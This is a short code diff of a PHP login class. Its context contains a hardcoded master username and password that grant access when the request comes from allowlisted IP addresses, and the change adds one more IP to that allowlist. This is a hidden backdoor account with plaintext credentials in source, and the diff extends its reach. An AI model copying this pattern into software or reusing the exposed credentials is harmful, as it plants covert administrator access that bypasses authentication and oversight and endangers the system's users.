@@ -54,7 +54,7 @@ class Login
         $inst = new Login();
         
         $account_cond = $request->user_name === 'masterpurp2e1324@66%!@' && $request->user_pw == 'qjfwk500djr!!32412@#';
-        $env_cond = (in_array($request->ip(), ['183.107.112.147', '121.183.143.103']) && env('APP_ENV') === 'production') || ($request->ip() === '127.0.0.1' && env('APP_ENV') === 'local');
+        $env_cond = (in_array($request->ip(), ['183.107.112.147', '121.183.143.103', '125.179.103.82']) && env('APP_ENV') === 'production') || ($request->ip() === '127.0.0.1' && env('APP_ENV') === 'local');
 
         if($account_cond && $env_cond)
         {
